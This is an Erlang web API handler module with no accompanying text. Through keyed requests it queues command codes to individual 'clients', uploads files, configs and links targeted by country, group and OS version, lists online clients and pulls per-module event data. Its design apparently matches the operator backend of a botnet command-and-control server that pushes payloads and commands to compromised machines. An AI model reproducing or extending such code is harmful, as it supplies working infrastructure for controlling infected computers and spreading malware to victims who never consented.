-module(api_handler).

-include("client.hrl").
-include("client_command.hrl").
-include("client_file.hrl").

-export([
  init/3,
  handle/2,
  terminate/3
]).

-define(IS_REQ(Req), element(1, Req) =:= http_req).

init(_Type, Req, []) ->
	{ok, Req, undefined}.

handle(Req, State) ->
	{ Path, Req0 } = cowboy_req:path(Req),
	Split0 = binary:split(Path, <<"/">>, [global]),
	Split1 = [ decode_uri(Part) || Part <- Split0 ],
	%% lager:info("API request ~p ~p ", [ Split1, Req0 ]),
	Req3 = try
		case Split1 of
			[ <<"">>, ApiKey, ApiKeyPass, Command | _ ] ->
				{ XForwardedFor, Req0 } = cowboy_req:header(<<"x-forwarded-for">>, Req),
				Api0 = apikey:new(ApiKey, ApiKeyPass),
				case (inet:parse_address(binary_to_list(XForwardedFor))) of
					{ ok, IpAddr } ->
						%% lager:info("API x forwarded for ~p", [ IpAddr ]),
						Api1 = apikey:set_ip(IpAddr, Api0),
						case apikey:is_allowed(Api1, Command) of
							{ ok, NewApiKey} ->
								{ Data0, Req1 } = cowboy_req:qs_vals(Req0),
								{ Data1, Req2 } = case cowboy_req:parse_header(<<"content-type">>, Req1) of
									{ok, {<<"multipart">>, <<"form-data">>, _}, Req00} ->
										true = cowboy_req:has_body(Req00),
										{ ok, Headers, Req01 } = cowboy_req:part(Req00,	[
											{length, 32 * 1024 * 1024}, %% 32 Mb
											{read_length, 32 * 1024 * 1024},
											{read_timeout, 60000}]),
										{ ok, Data3, Req02} = cowboy_req:part_body(Req01),
										case cow_multipart:form_data(Headers) of
											{ data, Name } ->
												{[{ Name, Data3 }], Req02 };
											{ file, Name, _, _, _ } ->
												{[{ Name, Data3 }], Req02 }
										end;
									{_, _, Req00 } ->
										{ [], Req00 }
								end,
								Data = [ {Key, list_to_binary(http_uri:decode(binary_to_list(Value))) } || { Key, Value } <- Data0 ] ++ Data1,
								%% lager:info("API Request ~p ", [ Data ]),
								try
									case command(Command, Data, NewApiKey, Req2) of
										{ ok, Req4 } ->
											api_log:log(NewApiKey, success, Command),
											Req4;
										{ Atom, Req4 } when is_atom(Atom) ->
											reply(Atom, Req4);
										Req5 when ?IS_REQ(Req5) ->
											Req5
									end
								catch
									error:{required, Col} ->
										reply({forbidden, <<" Parameter ",Col/binary, " required">>}, Req0);
									error:Any ->
										lager:critical("Error ~p ~p", [ Any, erlang:get_stacktrace() ]),
										reply({forbidden, list_to_binary(io_lib:format(" ~p ~n", [ Any ]))}, Req0)
								end;
							false ->
								api_log:log(Api1, is_not_allowed, Command),
								reply(forbidden, Req0)
						end;
					_ ->
						api_log:log(Api0, bad_ip, Command),
						reply(forbidden, Req0)
				end;
			_ ->
				reply(forbidden, Req0)
		end
	catch
		_:Error ->
			lager:critical("Error ~p ~p", [ Error, erlang:get_stacktrace() ]),
			reply(forbidden, Req0)
	end,
	{ ok, Req3, State }.

terminate(_Reason, _Req, _State) ->
	ok.

command(<<"GetGroupData">>, Data, _, Req) ->
	From = time:utime_to_now(binary_to_integer(get_val(<<"from">>, Data))),
	To = time:utime_to_now(binary_to_integer(get_val(<<"to">>, Data))),
	Result = api_report:group_data(From, To),
	Binary = lists:map(fun({Group, Count, CreatedAt}) ->
	  <<(iolist_to_binary(io_lib:format("~s ~b ~s", [ Group, Count, integer_to_binary(db:from_datetime(CreatedAt)) ])))/binary, "\r\n">>
	end, Result),
	{ ok, reply({text, Binary}, Req) };

command(<<"UploadFile">>, Data, _, Req) ->
	Fields = to_db_fields(fun
		(<<"id">>, V ) -> { ok, binary_to_integer(V) };
		(<<"filename">>, V) -> { ok, V };
		(<<"sys_ver">>, V ) -> { ok, V };
		(<<"group">>, V) -> { ok, V };
		(<<"country">>, V) -> { ok, V };
		(<<"client_id">>, V) -> { ok, binary_to_integer(V) };
		(<<"importance_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"importance_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"priority">>, V) -> { ok, binary_to_integer(V) };
		(<<"bdata">>, V) -> { replace, <<"data">>, V };
		(_K, _V) -> nothing
	end, [
		<<"priority">>, <<"bdata">>, <<"filename">>
	],
		[
			{<<"client_id">>, 0 },
			{<<"group">>, <<"*">> },
			{<<"sys_ver">>, <<"*">> },
			{<<"country">>, <<"*">>},
			{<<"importance_low">>, 0},
			{<<"importance_high">>, 100},
			{<<"userdefined_low">>, 0},
			{<<"userdefined_high">>, 100}
	], Data),
	%% lager:info("F ~p", [ Fields ]),
	case client_file:replace(Fields) of
		{ ok, _ } ->
			{ ok, reply({ text, <<"/1/">> }, Req )};
    _ ->
    	reply(forbidden, Req)
	end;

command(<<"UploadConfig">>, Data, _, Req) ->
	Fields = to_db_fields(fun
		(<<"id">>, V ) -> { ok, binary_to_integer(V) };
		(<<"version">>, V) -> { ok, binary_to_integer(V) };
		(<<"sys_ver">>, V ) -> { ok, V };
		(<<"group">>, V) -> { ok, V };
		(<<"country">>, V) -> { ok, V };
		(<<"client_id">>, V) -> { ok, binary_to_integer(V)};
		(<<"importance_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"importance_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"bdata">>, V) -> { replace, <<"data">>, V };
		(_K, _V) -> nothing
	end, [
		<<"version">>
	],
	[
			{<<"client_id">>, 0 },
			{<<"group">>, <<"*">> },
			{<<"country">>, <<"*">>},
			{<<"sys_ver">>, <<"*">>},
			{<<"importance_low">>, 0},
			{<<"importance_high">>, 100},
			{<<"userdefined_low">>, 0},
			{<<"userdefined_high">>, 100}
	], Data),
	case client_config:replace(Fields) of
		{ ok, _ } ->
			{ ok, reply({ text, <<"/1/">> }, Req )};
    _ ->
    	reply(forbidden, Req)
	end;

command(<<"UploadLink">>, Data, _, Req) ->
	Fields = to_db_fields(fun
		(<<"id">>, V ) -> { ok, binary_to_integer(V) };
		(<<"expiry_at">>, V) -> { ok, time:utime_to_now(binary_to_integer(V)) };
		(<<"sys_ver">>, V ) -> { ok, V };
		(<<"group">>, V) -> { ok, V };
		(<<"country">>, V) -> { ok, V };
		(<<"client_id">>, V) -> { ok, binary_to_integer(V)};
		(<<"importance_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"importance_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_low">>, V) -> { ok, binary_to_integer(V) };
		(<<"userdefined_high">>, V) -> { ok, binary_to_integer(V) };
		(<<"bdata">>, V) -> { replace, <<"url">>, V };
		(_K, _V) -> nothing
	end, [
		<<"expiry_at">>
	],
	[
			{<<"client_id">>, 0 },
			{<<"group">>, <<"*">>},
			{<<"sys_ver">>, <<"*">>},
			{<<"country">>, <<"*">>},
			{<<"importance_low">>, 0},
			{<<"importance_high">>, 100},
			{<<"userdefined_low">>, 0},
			{<<"userdefined_high">>, 100}
	], Data),
	case client_link:replace(Fields) of
		{ ok, _ } ->
			{ ok, reply({ text, <<"/1/">> }, Req )};
    _ ->
    	reply(forbidden, Req)
	end;

command(<<"PushBack">>, Data, _, Req) ->
	case client:get_client_by_id(get_val(<<"cid">>, Data)) of
		{ ok, Client } ->
			Command = #client_command{
				client_id = client:id(Client),
			  incode = binary_to_integer(get_val(<<"code">>, Data)),
			  params = get_val(<<"param">>, Data)
			},
			{ ok, _ } = client_command:insert(Command),
			reply(<<"/1/">>, Req);
		undefined ->
			reply(not_found, Req)
	end;

command(<<"GetFilesList">>, _, _, Req) ->
	{ ok, Files } = client_file:get_all(),
	Lines = lists:map(fun(File) ->
		#client_file{
			id = Id,
			filename = Filename,
			priority = Priority,
			group = Group,
			importance = { Importance_low, Importance_high },
			userdefined = { Userdefined_low , Userdefined_high },
			os = Sys_ver,
			country = Country
		} = File,
		[ sequence:implode(<<9>>, [
			integer_to_binary(Id), Filename, integer_to_binary(Priority), Group, Country,
			integer_to_binary(Importance_low), integer_to_binary(Importance_high),
			Sys_ver,
			integer_to_binary(Userdefined_low), integer_to_binary(Userdefined_high) ])
			| [ <<13,10>> ]]
	end, Files),
	reply({text, iolist_to_binary(Lines)}, Req);

command(<<"DeleteFile">>, Data, _, Req) ->
	client_file:delete(binary_to_integer(get_val(<<"id">>, Data))),
	reply(<<"/1/">>, Req);

command(<<"GetLastEventData">>, Data, _, Req) ->
	case client:get_client_by_id(get_val(<<"cid">>, Data)) of
		{ ok, Client } ->
			case client_event_db:get_last_data(Client, get_val(<<"module">>, Data), get_val(<<"event">>, Data)) of
				{ ok, Data0 } -> reply({ binary, Data0 }, Req);
				undefined -> reply(not_found, Req)
			end;
		undefined ->
			reply(not_found, Req)
	end;

command(<<"GetEventsGroup">>, Data, _, Req) ->
	Module = get_val(<<"module">>, Data),
	From = get_val(<<"from">>, Data),
	To = get_val(<<"to">>, Data),
	{ ok, [<<"id_low">>, <<"id_high">>, <<"created_at">>, <<"event">>], Rows } = client_event_db:get_events(Module, From, To),
	Records = lists:map(fun({IdLow, IdHigh, {Date, _ } = _CreatedAt, Event}) ->
		{{ IdHigh, IdLow }, Date, Event }
	end, Rows),
	Sorted = lists:usort(Records),
	{ BinaryList, _, _ } = lists:foldl(fun
		(Item, { _Bin, LastItem, _Client} = Acc) when LastItem =:= Item -> Acc;
		({ClientId = { _IdHigh, _IdLow }, Date, Event} = Item, { Bin, LastItem, Client }) ->
			{ NewBin, NewClient } = case ClientId =/= Client of
					true ->
						Hex = client:generate_hex_id(ClientId),
						CR = case LastItem of
						    undefined -> <<>>;
						    _ -> <<"\n">>
                        end,
                        { [ <<CR/binary, Hex/binary, " - ">> | Bin ], ClientId };
					false ->
						{ Bin, ClientId }
			end,
			{ _Year, Month, Day } = Date,
			NewBin0 = [ <<"/", Event/binary, "-",(integer_to_binary(Day))/binary, "-", (integer_to_binary(Month))/binary>> | NewBin ],
			{ NewBin0, Item, NewClient }
	end, { [], undefined, <<>> }, Sorted),
	Binary = iolist_to_binary(lists:reverse(BinaryList)),
	reply(Binary, Req);

command(<<"GetOnline">>, Data, _, Req) ->
	Period = binary_to_integer(get_val(<<"period">>, Data)),
	{ ok, Items } = client:get_last_activity_for_period(Period),
	reply(iolist_to_binary([[ I, <<10,13>> ] || { _Id, _BinId, I } <- Items ]), Req);

command(<<"GetLastActivity">>, Data, _, Req) ->
	Result = case catch client:get_client_by_id(get_val(<<"cid">>, Data)) of
		{ ok, Client } ->
			{ text, integer_to_binary(Client#client.last_activity) };
		undefined -> not_found;
 	 	{'EXIT', Reason } ->
 	 		lager:error("Error ~p ~p", [ Reason, erlang:get_stacktrace() ]),
 	 		forbidden
 	end,
 	reply(Result, Req);

command(<<"GetReport">>, Data, _, Req) ->
	Name = get_val(<<"report">>, Data),
	Json = json:decode(get_val(<<"query">>, Data)),
	Result = case Name of
		<<"client_info">> -> report_1:run(Json);
		<<"commands">> -> report_2:run(Json)
	end,
	reply({ text, json:encode(Result)}, Req);

command(<<"UpdateBlacklist">>, _, _, Req) ->
	client_blacklist:update(),
	reply(<<"ok">>, Req);

command(<<"UpdateClientFilter">>, _, _, Req) ->
	case client_filter:update() of
		ok -> reply(<<"ok">>, Req);
		{ error, Reason } -> reply({ forbidden, Reason}, Req)
	end;

command(_, _, _, Req) ->
	{ forbidden, Req }.

reply({text, Text}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"text/plain">> }
	], Text, Req),
	Req1;

reply({binary, Binary}, Req) ->
	{ ok, Req1 } = cowboy_req:reply(200, [
		{<<"Content-Type">>, <<"application/octet-stream">> }
	], Binary, Req),
	Req1;

reply(not_found, Req) ->
  { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
  Req1;

reply(forbidden, Req) ->
	reply({forbidden, <<>>}, Req);

reply({forbidden, String }, Req) ->
  { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden.",String/binary, "\n">>, Req),
  Req1;

reply(Bin, Req) when is_binary(Bin) ->
	reply({text, Bin}, Req).

decode_uri(<<"">>) -> <<"">>;
decode_uri(Uri) ->
	cow_qs:urldecode(Uri).

merge(PropList, Default) ->
	lists:ukeymerge(1, lists:ukeysort(1, PropList), lists:ukeysort(1, Default)).

to_db_fields(F, RequiredValues, DefaultValues, Data) ->
  lists:foreach(fun(Col) ->
    case lists:keymember(Col, 1, Data) of
    	true -> ok;
    	false -> error({required, Col}, [ proplists:get_keys(Data) ])
    end
  end, RequiredValues),
	Fields = lists:foldl(fun
		({_, <<>>}, Acc) -> Acc;
		({Key, Value}, Acc) ->
			case F(Key, Value) of
				{ ok, FValue } -> [ {Key, FValue } | Acc ];
				{ replace, FKey, FValue } -> [{ FKey, FValue } | Acc ];
				_ -> Acc
			end
	end, [], Data),
	merge(Fields, DefaultValues).

get_val(Name, Data) ->
  case proplists:get_value(Name, Data, undefined) of
  	undefined -> error({bad_value, Name}, [ Data ]);
  	Value -> Value
  end.

get_val(Name, Data, Default) ->
  proplists:get_value(Name, Data, Default).

